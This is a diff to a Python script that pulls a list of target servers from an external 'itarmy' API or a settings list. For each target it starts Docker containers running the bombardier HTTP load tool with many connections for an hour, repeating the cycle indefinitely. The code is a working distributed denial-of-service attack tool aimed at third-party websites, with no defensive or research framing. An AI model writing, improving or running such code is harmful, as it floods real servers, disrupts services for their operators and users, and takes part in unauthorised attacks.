@@ -5,15 +5,17 @@ import json
 import docker
 from settings import *
 import time
+from kill_all_containers import containers_clean
 
 
 def kill_servers():
-    urls = json.loads(requests.get('https://itarmy.pp.ua/api/?type=online').text)[:LIMIT]
-
+    urls = URLS[:LIMIT] if URLS else json.loads(requests.get('https://itarmy.pp.ua/api/?type=online').text)[:LIMIT]
+    urls = [url.strip().decode('UTF-8') for url in urls]
+    print(urls)
     client = docker.from_env()
     for url in urls:
-        cont = client.containers.run("alpine/bombardier:latest", f'-ti -c {CONNECTIONS} -d 3600s -l {url}', detach=True,
-                                     remove=True)
+        cont = client.containers.run("alpine/bombardier:latest", f'-c {CONNECTIONS} -d 3600s -l {url}', detach=True,
+                                     )
         print(cont.logs())
 
 
@@ -22,4 +24,5 @@ if __name__ == '__main__':
         kill_servers()
         print('Time to Sleep')
         time.sleep(3700)
+        containers_clean()
 
